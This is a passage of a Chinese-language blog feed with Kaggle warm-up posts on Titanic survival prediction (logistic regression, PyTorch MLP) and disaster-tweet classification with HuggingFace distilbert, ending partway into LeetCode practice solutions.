na</span></span><br><span class="line">    df = df.drop([<span class="string">&#x27;Name&#x27;</span>, <span class="string">&#x27;PassengerId&#x27;</span>, <span class="string">&#x27;Ticket&#x27;</span>, <span class="string">&#x27;Cabin&#x27;</span>], axis=<span class="number">1</span>)</span><br><span class="line">    df[<span class="string">&#x27;Age&#x27;</span>] = df[<span class="string">&#x27;Age&#x27;</span>].fillna(df[<span class="string">&#x27;Age&#x27;</span>].mean())</span><br><span class="line">    <span class="comment"># do one hot encoding</span></span><br><span class="line">    dummy_columns = [<span class="string">&#x27;Sex&#x27;</span>, <span class="string">&#x27;Pclass&#x27;</span>,<span class="string">&#x27;Embarked&#x27;</span>]</span><br><span class="line">    df = pd.get_dummies(df, columns=dummy_columns)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># do scale to numerical features</span></span><br><span class="line">    scaler = MinMaxScaler()</span><br><span class="line">    feature = df.loc[:, ~df.columns.isin([<span class="string">&#x27;Survived&#x27;</span>])]</span><br><span class="line">    feature = pd.DataFrame(scaler.fit_transform(feature.values), columns=feature.columns)</span><br><span class="line">    <span class="keyword">return</span> feature</span><br><span class="line"></span><br><span class="line">label = train_data[<span class="string">&#x27;Survived&#x27;</span>]</span><br><span class="line">feature = preprocessing(train_data.loc[:, ~train_data.columns.isin([<span class="string">&#x27;Survived&#x27;</span>])])</span><br><span class="line">feature.head()</span><br></pre></td></tr></table></figure><p>处理完之后数据长成这样 <img src="processed_data.png" alt="processed_data" /></p><p>后续丢模型训练就行,二分类可以直接丢LogisticRegression,或者也可以自己写个MLP</p><h2 id="logisticregression">LogisticRegression</h2><p>平时并没有怎么用sklearn,不过试了下感觉挺不错的,也可以自己手写一个,预测结果大概也是0.8左右. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sklearn Logistic Regression</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"></span><br><span class="line"><span class="comment"># potentially use rfe for feature selection</span></span><br><span class="line"><span class="comment"># rfe = RFE(model, 8)</span></span><br><span class="line"><span class="comment"># rfe.fit(X, y)</span></span><br><span class="line">LR = LogisticRegression()</span><br><span class="line">LR.fit(feature,label)</span><br><span class="line">y_pred = LR.predict(feature)</span><br><span class="line"><span class="built_in">print</span>(accuracy_score(y_pred, label))</span><br><span class="line"><span class="comment"># 0.8013468013468014</span></span><br></pre></td></tr></table></figure></p><h3 id="k-folder">K-Folder</h3><p>顺手做一手K-Folder</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># K-fold cross validation</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score, KFold</span><br><span class="line"></span><br><span class="line">kf = KFold(<span class="number">10</span>)</span><br><span class="line">score = cross_val_score(LR, feature, label, cv=kf)</span><br><span class="line"><span class="built_in">print</span>(score)</span><br><span class="line"><span class="comment"># [0.77777778 0.83146067 0.7752809  0.80898876 0.7752809  0.78651685 0.74157303 0.78651685 0.86516854 0.79775281]</span></span><br></pre></td></tr></table></figure><h2 id="pytorch-mlp">PyTorch MLP</h2><p>主要写一个dataset和dataloader, 然后<code>nn.Module</code>写一个model, 然后<code>zero_grad</code>,<code>backward</code>,<code>step</code>. 最后手动存y做一下accuracy的输出. 这里model删除第2,3层全连和1,2层激活函数,把第一层输出改成1即pytorch实现的LR,效果也和sklearn的差不多.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PyTorch MLP</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset, DataLoader</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line">device = torch.device(<span class="string">&#x27;cuda&#x27;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&#x27;cpu&#x27;</span>)</span><br><span class="line"></span><br><span class="line">train_x, valid_x, train_y, valid_y = train_test_split(feature, label, test_size=<span class="number">0.2</span>)</span><br><span class="line"><span class="comment"># create dataset class</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TitanicDataset</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        self.x = torch.from_numpy(x.values).<span class="built_in">float</span>().to(device)</span><br><span class="line">        self.y = torch.from_numpy(y.values).<span class="built_in">float</span>().to(device)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.x) != <span class="built_in">len</span>(self.y):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unequal Size of X and Y!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">len</span>(self.x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, idx</span>):</span><br><span class="line">        <span class="keyword">return</span> self.x[idx],self.y[idx]</span><br><span class="line"></span><br><span class="line"><span class="comment"># init dataloader</span></span><br><span class="line">train_dataset = TitanicDataset(train_x, train_y)</span><br><span class="line">train_iter = DataLoader(train_dataset, batch_size=<span class="number">128</span>, shuffle=<span class="literal">True</span>)</span><br><span class="line">valid_dataset = TitanicDataset(valid_x, valid_y)</span><br><span class="line">valid_iter = DataLoader(valid_dataset, batch_size=<span class="number">128</span>, shuffle=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MLP</span>(torch.nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n_features</span>):</span><br><span class="line">        <span class="built_in">super</span>(MLP, self).__init__()</span><br><span class="line">        self.fc1 = torch.nn.Linear(n_features, <span class="number">256</span>)</span><br><span class="line">        self.fc2 = torch.nn.Linear(<span class="number">256</span>, <span class="number">128</span>)</span><br><span class="line">        self.fc3 = torch.nn.Linear(<span class="number">128</span>, <span class="number">1</span>)</span><br><span class="line">        self.fn1 = torch.nn.ReLU()</span><br><span class="line">        self.fn2 = torch.nn.ReLU()</span><br><span class="line">        self.fn3 = torch.nn.Sigmoid()</span><br><span class="line">        </span><br><span class="line">        torch.nn.init.xavier_uniform_(self.fc1.weight)</span><br><span class="line">        torch.nn.init.xavier_uniform_(self.fc2.weight)</span><br><span class="line">        torch.nn.init.xavier_uniform_(self.fc3.weight)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.fn1(self.fc1(x))</span><br><span class="line">        x = self.fn2(self.fc2(x))        </span><br><span class="line">        x = self.fn3(self.fc3(x))</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">_, n_features = train_x.shape</span><br><span class="line">model = MLP(n_features)</span><br><span class="line">model.to(device)</span><br><span class="line"></span><br><span class="line">lr = <span class="number">1e-4</span></span><br><span class="line">loss = torch.nn.BCELoss()</span><br><span class="line">optimizer = torch.optim.Adam(model.parameters(), lr=lr)</span><br><span class="line">epoch = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">model.train()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(epoch):</span><br><span class="line">    total_loss = <span class="number">0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    correct = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> train_iter:</span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        y_pred = torch.squeeze(model(x))</span><br><span class="line">        l = loss(y_pred, y)</span><br><span class="line">        l.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        total_loss += l.item()</span><br><span class="line">        total += <span class="built_in">len</span>(y)</span><br><span class="line">        correct += <span class="built_in">sum</span>(y_pred.<span class="built_in">round</span>() == y)</span><br><span class="line">    </span><br><span class="line">    train_accuracy = correct / total</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    correct = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> valid_iter:</span><br><span class="line">        y_pred = torch.squeeze(model(x))</span><br><span class="line">        total += <span class="built_in">len</span>(y)</span><br><span class="line">        correct += <span class="built_in">sum</span>(y_pred.<span class="built_in">round</span>() == y)</span><br><span class="line">    test_accuracy = correct / total</span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span>)%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Epoch <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>:<span class="subst">&#123;total_loss&#125;</span>, train accuracy:<span class="subst">&#123;train_accuracy&#125;</span>, test accuracy:<span class="subst">&#123;test_accuracy&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>输出结果 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Epoch 10:3.5960923433303833, train accuracy:0.7064606547355652, test accuracy:0.7430167198181152</span><br><span class="line">Epoch 20:3.1748223900794983, train accuracy:0.7851123809814453, test accuracy:0.8156424164772034</span><br><span class="line">Epoch 30:2.885961800813675, train accuracy:0.8089887499809265, test accuracy:0.832402229309082</span><br><span class="line">Epoch 40:2.7163011729717255, train accuracy:0.8047752976417542, test accuracy:0.8212290406227112</span><br><span class="line">Epoch 50:2.670557290315628, train accuracy:0.8089887499809265, test accuracy:0.8156424164772034</span><br><span class="line">Epoch 60:2.5934107899665833, train accuracy:0.8202247023582458, test accuracy:0.8212290406227112</span><br><span class="line">Epoch 70:2.5730879604816437, train accuracy:0.8188202381134033, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 80:2.574642688035965, train accuracy:0.8146067261695862, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 90:2.5959592163562775, train accuracy:0.8160112500190735, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 100:2.555866301059723, train accuracy:0.8132022619247437, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 110:2.5190521478652954, train accuracy:0.8160112500190735, test accuracy:0.832402229309082</span><br><span class="line">Epoch 120:2.5432372093200684, train accuracy:0.8132022619247437, test accuracy:0.8379887938499451</span><br><span class="line">Epoch 130:2.5101636350154877, train accuracy:0.8132022619247437, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 140:2.4863936603069305, train accuracy:0.8146067261695862, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 150:2.441671073436737, train accuracy:0.8117977380752563, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 160:2.452588587999344, train accuracy:0.8160112500190735, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 170:2.4411253333091736, train accuracy:0.8132022619247437, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 180:2.5097872614860535, train accuracy:0.8117977380752563, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 190:2.428959161043167, train accuracy:0.817415714263916, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 200:2.395860642194748, train accuracy:0.8188202381134033, test accuracy:0.8268156051635742</span><br></pre></td></tr></table></figure></p><h2 id="submission">submission</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># submission</span></span><br><span class="line">test_data = pd.read_csv(test_path)</span><br><span class="line">test_data = preprocessing(test_data)</span><br><span class="line">text_data = torch.from_numpy(test_data.values).<span class="built_in">float</span>().to(device)</span><br><span class="line">y_pred = model(text_data).<span class="built_in">round</span>().detach().cpu()</span><br><span class="line"></span><br><span class="line">submission_data = pd.read_csv(submission_path)</span><br><span class="line">submission_data.head()</span><br><span class="line">submission_data[<span class="string">&#x27;Survived&#x27;</span>] = y_pred.to(torch.int32)</span><br><span class="line">submission_data.to_csv(<span class="string">&#x27;submission.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br><span class="line">submission_data.head()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Kaggle-warmup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kaggle_warmup1-TextClassification</title>
      <link href="/2024/04/04/Kaggle-warmup1-TextClassification/"/>
      <url>/2024/04/04/Kaggle-warmup1-TextClassification/</url>
      
        <content type="html"><![CDATA[<p>最近一直在写leetcode,前段时间学的ML相关东西都有点忘了,近期通过Kaggle进行一下快速复习,顺便学习一些新东西.</p><p>这次的练习1主要是Kaggle上面的<a href="https://www.kaggle.com/competitions/nlp-getting-started">Natural Language Processing with Disaster Tweets</a></p><h2 id="huggingface-transfomers">HuggingFace-Transfomers</h2><p>之前见到过一次但没有动手来写,印象里是一个很functional的工具,还有pipline可以直接cmd使用,这次去看了下文档动手写了下.</p><p>首先看下数据长啥样 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">train_url = <span class="string">&#x27;/kaggle/input/nlp-getting-started/train.csv&#x27;</span></span><br><span class="line">train_data = pd.read_csv(train_url)</span><br><span class="line">train_data.head()</span><br></pre></td></tr></table></figure> <img src="train_data_head.png" alt="train_head" /></p><p>然后需要注意使用transformers需要wandb的token,addon里面自己添加key即可 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">!pip install transformers datasets evaluate accelerate wandb</span><br><span class="line"><span class="keyword">import</span> wandb</span><br><span class="line"><span class="keyword">from</span> kaggle_secrets <span class="keyword">import</span> UserSecretsClient</span><br><span class="line">user_secrets = UserSecretsClient()</span><br><span class="line">wandb_token = user_secrets.get_secret(<span class="string">&quot;wandb_token&quot;</span>)</span><br><span class="line"></span><br><span class="line">! wandb login $wandb_token</span><br></pre></td></tr></table></figure></p><p>然后我们使用<code>distilbert/distilbert-base-uncased</code>模型,这里搜索了一下<code>distilbert</code>,这是一种通过softmax with temperature对<code>bert</code>做出性能优化的模型,具体可以看这里<a href="https://paddlepedia.readthedocs.io/en/latest/tutorials/model_compress/model_distill/DistilBERT.html">DistilBert</a>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">import</span> evaluate</span><br><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> Dataset</span><br><span class="line"></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&#x27;distilbert/distilbert-base-uncased&#x27;</span>)</span><br><span class="line">accuracy = evaluate.load(<span class="string">&#x27;accuracy&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_metrics</span>(<span class="params">eval_pred</span>):</span><br><span class="line">    predictions, labels = eval_pred</span><br><span class="line">    predictions = np.argmax(predictions, axis=-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> accuracy.compute(predictions=predictions, references=labels)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pre_processing</span>(<span class="params">example</span>):</span><br><span class="line">    <span class="keyword">return</span> tokenizer(example[<span class="string">&#x27;text&#x27;</span>], truncation=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train_data = train_data.rename(columns=&#123;<span class="string">&#x27;target&#x27;</span>:<span class="string">&#x27;label&#x27;</span>&#125;)</span><br><span class="line">train_df, val_df = train_test_split(train_data, test_size=<span class="number">.2</span>)</span><br><span class="line"></span><br><span class="line">train_dataset = Dataset.from_pandas(train_df)</span><br><span class="line">valid_dataset = Dataset.from_pandas(val_df)</span><br><span class="line">test_dataset = Dataset.from_pandas(test_data)</span><br><span class="line"></span><br><span class="line">tokenized_train = train_dataset.<span class="built_in">map</span>(pre_processing, batched=<span class="literal">True</span>)</span><br><span class="line">tokenized_valid = valid_dataset.<span class="built_in">map</span>(pre_processing, batched=<span class="literal">True</span>)</span><br><span class="line">tokenized_test = test_dataset.<span class="built_in">map</span>(pre_processing, batched=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>需要注意这里有个坑,需要rename一下column_name否则后续train会报错. 要求文字部分为<code>text</code>且target为<code>label</code>.</p><p>最后设置参数,定义trainer即可 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoModelForSequenceClassification, TrainingArguments, Trainer</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> DataCollatorWithPadding</span><br><span class="line"></span><br><span class="line">model = AutoModelForSequenceClassification.from_pretrained(<span class="string">&#x27;distilbert/distilbert-base-uncased&#x27;</span>, num_labels=<span class="number">2</span>)</span><br><span class="line">data_collator = DataCollatorWithPadding(tokenizer=tokenizer)</span><br><span class="line"></span><br><span class="line">training_args = TrainingArguments(</span><br><span class="line">    output_dir=<span class="string">&#x27;./disaster_NLP&#x27;</span>,</span><br><span class="line">    learning_rate=<span class="number">2e-5</span>,</span><br><span class="line">    per_device_train_batch_size=<span class="number">16</span>,</span><br><span class="line">    per_device_eval_batch_size=<span class="number">16</span>,</span><br><span class="line">    num_train_epochs=<span class="number">2</span>,</span><br><span class="line">    weight_decay=<span class="number">0.01</span>,</span><br><span class="line">    evaluation_strategy=<span class="string">&#x27;epoch&#x27;</span>,</span><br><span class="line">    save_strategy=<span class="string">&#x27;epoch&#x27;</span>,</span><br><span class="line">    load_best_model_at_end=<span class="literal">True</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">trainer = Trainer(</span><br><span class="line">    model=model,</span><br><span class="line">    args=training_args,</span><br><span class="line">    train_dataset=tokenized_train,</span><br><span class="line">    eval_dataset=tokenized_valid,</span><br><span class="line">    tokenizer=tokenizer,</span><br><span class="line">    data_collator=data_collator,</span><br><span class="line">    compute_metrics=compute_metrics</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">trainer.train()</span><br></pre></td></tr></table></figure></p><p>训练完存到submit提交即可 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preds = trainer.predict(tokenized_test)</span><br><span class="line">preds = np.argmax(preds[:<span class="number">3</span>][<span class="number">0</span>],axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">submission_path = <span class="string">&#x27;/kaggle/input/nlp-getting-started/sample_submission.csv&#x27;</span></span><br><span class="line">submission_data = pd.read_csv(submission_path)</span><br><span class="line">submission_data[<span class="string">&#x27;target&#x27;</span>] = preds</span><br><span class="line">submission_data.to_csv(<span class="string">&#x27;submission.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></p><p>纯文档实现,调参之后性能可能可以优化这里不做讨论了.</p>]]></content>
      
      
      <categories>
          
          <category> Kaggle-warmup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Google OA练习</title>
      <link href="/2024/03/25/Google-OA%E7%BB%83%E4%B9%A0/"/>
      <url>/2024/03/25/Google-OA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="minimum-difference-between-largest-and-smallest-value-in-three-moves">1509. Minimum Difference Between Largest and Smallest Value in Three Moves</h2><p>You are given an integer array <code>nums</code>.</p><p>In one move, you can choose one element of <code>nums</code> and change it to <code>any value</code>.</p><p>Return the minimum difference between the largest and smallest value of <code>nums</code> after performing at most three moves.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [5,3,2,4]</span><br><span class="line">Output: 0</span><br><span class="line">Explanation: We can make at most 3 moves.</span><br><span class="line">In the first move, change 2 to 3. nums becomes [5,3,3,4].</span><br><span class="line">In the second move, change 4 to 3. nums becomes [5,3,3,3].</span><br><span class="line">In the third move, change 5 to 3. nums becomes [3,3,3,3].</span><br><span class="line">After performing 3 moves, the difference between the minimum and maximum is 3 - 3 = 0.</span><br></pre></td></tr></table></figure><p>知道最大4和最小4即可 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minDifference</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(nums) &lt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="comment"># init</span></span><br><span class="line">        min_list = []</span><br><span class="line">        max_list = []</span><br><span class="line">        min_list[:] = nums[:<span class="number">4</span>]</span><br><span class="line">        max_list[:] = nums[:<span class="number">4</span>]</span><br><span class="line">        <span class="comment"># fill the list</span></span><br><span class="line">        <span class="comment"># or we can do sorted and take sorted_lst[:4] and sorted_lst[4:]</span></span><br><span class="line">        <span class="comment"># but it will be nlogn instead of n</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums[<span class="number">4</span>:]:</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="built_in">min</span>(max_list):</span><br><span class="line">                max_list.remove(<span class="built_in">min</span>(max_list))</span><br><span class="line">                max_list.append(i)</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="built_in">max</span>(min_list):</span><br><span class="line">                min_list.remove(<span class="built_in">max</span>(min_list))</span><br><span class="line">                min_list.append(i)</span><br><span class="line">        min_list = <span class="built_in">sorted</span>(min_list)</span><br><span class="line">        max_list = <span class="built_in">sorted</span>(max_list)</span><br><span class="line">        res = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> max_list[i] - min_list[i] &lt; res:</span><br><span class="line">                res = max_list[i] - min_list[i]</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> res &lt; <span class="number">0</span> <span class="keyword">else</span> res</span><br></pre></td></tr></table></figure></p><h2 id="number-of-good-ways-to-split-a-string">1525. Number of Good Ways to Split a String</h2><p>You are given a string <code>s</code>.</p><p>A split is called good if you can split <code>s</code> into two non-empty strings s_left and s_right where their concatenation is equal to <code>s</code> (i.e., s_left + s_right = s) and the number of distinct letters in s_left and s_right is the same.</p><p>Return the number of good splits you can make in <code>s</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;aacaba&quot;</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: There are 5 ways to split &quot;aacaba&quot; and 2 of them are good. </span><br><span class="line">(&quot;a&quot;, &quot;acaba&quot;) Left string and right string contains 1 and 3 different letters respectively.</span><br><span class="line">(&quot;aa&quot;, &quot;caba&quot;) Left string and right string contains 1 and 3 different letters respectively.</span><br><span class="line">(&quot;aac&quot;, &quot;aba&quot;) Left string and right string contains 2 and 2 different letters respectively (good split).</span><br><span class="line">(&quot;aaca&quot;, &quot;ba&quot;) Left string and right string contains 2 and 2 different letters respectively (good split).</span><br><span class="line">(&quot;aacab&quot;, &quot;a&quot;) Left string and right string contains 3 and 1 different letters respectively.</span><br></pre></td></tr></table></figure><p>第一感觉两字典然后一个遍历来实时更新两侧字典,检查key数量即可,实际实现后也是beat 32%runtime和95%Mem. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span 